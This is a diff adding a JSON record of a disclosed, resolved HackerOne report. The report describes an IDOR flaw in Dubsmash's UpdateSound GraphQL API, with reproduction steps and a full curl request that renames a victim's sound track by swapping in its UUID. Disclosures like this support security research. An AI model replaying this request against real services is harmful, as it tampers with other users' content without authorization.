@@ -1,0 +1,123 @@
+{
+  "id": 1102365,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTAyMzY1",
+  "url": "https://hackerone.com/reports/1102365",
+  "title": "[dubmash] Lack of authorization checks - Update Sound Titles",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-12T20:02:18.406Z",
+  "submitted_at": "2021-02-12T20:02:18.541Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sandeep_rj49",
+    "url": "/sandeep_rj49",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/TbAGwNLNTZ8VauwPRotsxp8e/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35710,
+    "url": "https://hackerone.com/reddit",
+    "handle": "reddit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Reddit",
+      "twitter_handle": "reddit",
+      "website": "https://www.reddit.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-10-21T19:49:54.149Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-21T09:24:47.383Z",
+  "team_member_agreed_on_going_public_at": "2021-10-21T19:49:53.989Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nDuring the security testing, it has been observed that the `UpdateSound` api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known. \n\n\n## Steps To Reproduce:\n1. Replay the vulnerable request using a valid authorization token. \n2. Change the uuid parameter value with the victim's sound track UUID. \n3. Victim's sound track title will be changed. \n\n##Vulnerable request:\ncurl -i -s -k -X $'POST' \\\n    -H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\\\"88-IVjhmW06Njcacim4nwHnJNviYsE\\\"' \\\n    -b $'__cfduid=' \\\n    --data-binary $'{\\\"query\\\":\\\"mutation UpdateSound($input: UpdateSoundInput!) {\\\\n  updateSound(input: $input) {\\\\n    __typename\\\\n    sound {\\\\n      __typename\\\\n      ...SoundFragment\\\\n    }\\\\n  }\\\\n}\\\\nfragment SoundFragment on Sound {\\\\n  __typename\\\\n  uuid\\\\n  created_at\\\\n  sound\\\\n  name\\\\n  waveform_raw_data\\\\n  liked\\\\n  soundStatus: status\\\\n  creator {\\\\n    __typename\\\\n    ...ContentCreatorFragment\\\\n  }\\\\n  share_link\\\\n  num_likes\\\\n  num_videos\\\\n}\\\\nfragment ContentCreatorFragment on User {\\\\n  __typename\\\\n  username\\\\n  uuid\\\\n  date_joined\\\\n  followed\\\\n  has_invite_badge\\\\n  badges\\\\n  profile_picture\\\\n}\\\",\\\"variables\\\":{\\\"input\\\":{\\\"uuid\\\":\\\"a687eb61ad814a09a8a85cedef7837f3\\\",\\\"name\\\":\\\"test12355556777\\\"}}}' \\\n    $'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'\n\n## Impact\n\nAn attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.",
+  "weakness": {
+    "id": 124,
+    "name": "Improper Authorization"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 19,
+  "voters": [
+    "m4khn0",
+    "tinmo",
+    "thepath",
+    "shreyaschavhan",
+    "naaash",
+    "sachin_kr",
+    "pr0f0x01",
+    "shoponalom29",
+    "ronisec",
+    "eminfidan",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 60161,
+    "asset_type": "APPLE_STORE_APP_ID",
+    "asset_identifier": "918820076",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
